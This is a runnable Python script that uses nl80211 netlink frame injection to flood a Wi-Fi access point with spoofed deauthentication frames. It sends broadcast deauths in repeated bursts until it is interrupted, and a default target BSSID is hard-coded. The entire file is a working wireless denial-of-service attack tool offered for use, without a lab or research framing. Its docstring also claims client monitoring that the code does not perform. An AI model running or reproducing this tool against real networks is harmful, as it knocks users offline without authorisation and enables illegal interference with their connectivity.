#!/usr/bin/env python3
"""
Auto-deauth: monitors for clients and immediately deauths them.
Also sends periodic broadcast deauths.
Runs until keyboard interrupt.
"""
import socket, struct, fcntl, sys, time, subprocess

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def build_nl_frame(fid, ifidx, freq, frame, seq):
    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq, 0)
    return nlhdr + payload

def send_deauth_pair(s, fid, ifidx, freq, our_mac, bssid, target, seq):
    """Send primer + spoofed deauth pair."""
    # Primer
    p = struct.pack('<HH', 0x00c0, 0) + b'\xff\xff\xff\xff\xff\xff' + our_mac + bssid
    p += struct.pack('<HH', (seq & 0xfff) << 4, 7)
    s.send(build_nl_frame(fid, ifidx, freq, p, seq))
    try: s.recv(4096)
    except: pass

    # Spoofed
    d = struct.pack('<HH', 0x00c0, 0) + target + bssid + bssid
    d += struct.pack('<HH', ((seq+1) & 0xfff) << 4, 7)
    s.send(build_nl_frame(fid, ifidx, freq, d, seq+1))
    try: s.recv(4096)
    except: pass

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else 'wlan0'
    bssid_str = sys.argv[2] if len(sys.argv) > 2 else '04:67:61:D6:DC:92'
    freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412

    bssid = bytes.fromhex(bssid_str.replace(':', ''))
    broadcast = b'\xff\xff\xff\xff\xff\xff'

    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
    our_mac = info[18:24]
    sock.close()

    print(f"[*] Auto-deauth: {iface} idx={ifidx} mac={our_mac.hex(':')}")
    print(f"[*] Target AP: {bssid.hex(':')} freq={freq}")
    print("[*] Sending broadcast deauths every 2 seconds...")
    print("[*] Press Ctrl+C to stop")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(1)

    seq = 10
    total = 0
    try:
        while True:
            # Send burst of 5 broadcast deauths
            for _ in range(5):
                send_deauth_pair(s, fid, ifidx, freq, our_mac, bssid, broadcast, seq)
                seq += 2
                total += 1
                time.sleep(0.05)

            if total % 25 == 0:
                print(f"  [{total} deauths sent]")

            time.sleep(1.5)  # Wait before next burst
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Total deauths: {total}")
    finally:
        s.close()

if __name__ == '__main__':
    main()
